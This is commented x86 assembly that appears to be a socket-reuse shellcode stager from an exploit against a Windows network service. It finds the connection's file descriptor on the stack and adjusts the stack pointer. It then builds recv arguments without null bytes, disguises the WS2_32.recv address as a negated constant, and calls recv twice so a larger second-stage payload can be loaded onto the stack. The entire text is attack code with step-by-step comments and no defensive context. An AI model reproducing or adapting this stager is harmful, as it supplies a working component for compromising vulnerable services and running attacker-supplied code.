; -- find and save file descriptor -- ;
push esp                    ; get ptr to esp
pop eax                     ; load esp address into eax
add ax, 0x188               ; add 0x188 to eax (esp) to get ptr to file descriptor
push [eax]                  ; push dereferenced ptr onto stack (0x58 in example)
pop esi                     ; store fd in non-volatile register for later use
; ------------------------- ;

; -- adjust the stack -- ; 
sub esp, 0x74               ; move esp to a lower memory address than our pivot
; ------------------------- ;

; -- setup flags and len params -- ;
xor ebx, ebx                ; zero out ebx
push ebx                    ; recv param - flags
add bh, 0x4                 ; set ebx to 0x00000400
sub ebx, 0x6d               ; set ebx to 0x00000393
push ebx                    ; recv param - len
; ------------------------- ;

; -- setup buf and s params -- ;
push esp                    ; ptr to esp on stack
pop ebx                     ; ptr to esp in ebx
add ebx, 0x78               ; ebx (esp) + 0x78 - location of recv buffer
push ebx                    ; recv param - buf
push esi                    ; recv param - file descriptor
; ------------------------- ;

; -- make the call to recv -- ;
mov edi, ffbfdad4           ; 2s complement of WS2_32.recv address
neg edi                     ; edi is now == 0x0040252c -> WS2_32.recv
call edi                    ; call WS2_32.recv 
; ------------------------- ; 

; -- make second call to recv -- ; 
xor ecx, ecx                ; zero out ecx
push ecx                    ; recv param - flags (0)
push eax                    ; recv param - len (0x393 from return value of first recv call)
push ebx                    ; recv param - buf (same location as first recv call)
push esi                    ; recv param - file descriptor (same fd as first recv call)
call edi                    ; call WS2_32.recv 
; ------------------------- ;